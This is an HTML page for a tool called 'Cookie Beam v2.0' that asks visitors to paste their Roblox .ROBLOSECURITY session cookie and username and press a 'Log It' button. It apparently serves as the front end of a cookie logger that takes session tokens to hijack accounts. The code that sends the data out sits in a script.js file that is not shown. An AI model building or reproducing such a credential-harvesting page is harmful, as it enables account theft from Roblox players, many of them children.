<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Beam v2.0 By Userspin45</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>🍪 Cookie Beam v2.0</h1>
        <h2>By Userspin45</h2>
        <p class="subtitle">Paste .ROBLOSECURITY – detects token automatically</p>
        <div class="input-group">
            <label for="cookieInput">.ROBLOSECURITY Cookie:</label>
            <input type="text" id="cookieInput" placeholder="Paste .ROBLOSECURITY here...">
        </div>
        <div class="input-group">
            <label for="userInput">Roblox Username (for reference):</label>
            <input type="text" id="userInput" placeholder="Enter username (optional)...">
        </div>
        <div id="token-detection" class="detection-box">🔍 Token detection: Waiting...</div>
        <button id="logBtn">📤 Log It</button>
        <div id="result"></div>
        <div class="footer">🍪 Cookie Beam v2.0 • Made by Userspin45</div>
    </div>
    <script src="script.js"></script>
</body>
</html>
